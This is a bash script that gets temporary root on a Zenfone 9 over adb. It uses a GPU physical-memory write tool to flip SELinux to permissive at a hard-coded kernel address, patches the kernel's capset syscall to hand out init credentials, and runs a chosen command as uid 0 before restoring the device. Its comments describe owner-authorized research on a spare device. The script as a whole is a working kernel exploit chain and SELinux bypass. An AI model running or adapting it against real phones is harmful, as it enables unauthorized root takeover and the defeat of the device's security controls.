#!/usr/bin/env bash
# root-now.sh [command...] — temporary root on the Zenfone 9 (uid 0, SELinux context u:r:kernel:s0).
#
# Why SELinux must be permissive: the patched capset path calls commit_creds(&init_cred), which gives
# the process init_cred's security SID (the *kernel* domain) without a proper domain transition.
# Under Enforcing, SELinux kills that process instead (silent, exit=1). Both verified on device.
#
# Flow: SELinux -> permissive | patch __do_sys_capset | run command as uid 0 | restore text + SELinux.
# Requires on device: /data/local/tmp/cheese_pa (GPU primitive), /data/local/tmp/call_capset.
# Scope: owner-authorized research on the spare, backed-up device. Leaves kernel text pristine.
set -u
[ -f "$(dirname "$0")/../device.env" ] && . "$(dirname "$0")/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
DIR=$(cd "$(dirname "$0")" && pwd)
CMD=${*:-id}

set_selinux() {  # $1 = dword for selinux_state (0x01010000 = permissive, 0x01010001 = enforcing)
    adb -s "$S" shell "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=0xaaa40b98 \
CHEESE_WRITE_PA=0xaaa40b98 CHEESE_WRITE_VAL=$1 timeout 120 /data/local/tmp/cheese_pa \
> /data/local/tmp/pk.txt 2>&1; grep -c issued /data/local/tmp/pk.txt" </dev/null 2>&1 | tr -d '\r'
}

state=pre
restore() {
    [ "$state" = clean ] && return 0
    state=clean
    echo "[root-now] restoring kernel text..."
    "$DIR/patch-dwords.sh" restore 2>&1 | tail -1
    echo "[root-now] restoring SELinux to Enforcing..."
    set_selinux 0x01010001 >/dev/null
    echo "[root-now] device left clean (text pristine, SELinux Enforcing)"
}
trap restore EXIT INT TERM

echo "[root-now] SELinux -> Permissive"
set_selinux 0x01010000 >/dev/null
sleep 1
echo "[root-now] getenforce: $(adb -s "$S" shell getenforce </dev/null 2>&1)"

echo "[root-now] patching kernel text (13 dwords, ~4 min)..."
"$DIR/patch-dwords.sh" write 2>&1 | tail -1

echo "[root-now] running as root: $CMD"
adb -s "$S" shell "/data/local/tmp/call_capset $CMD" </dev/null 2>&1

restore
trap - EXIT INT TERM
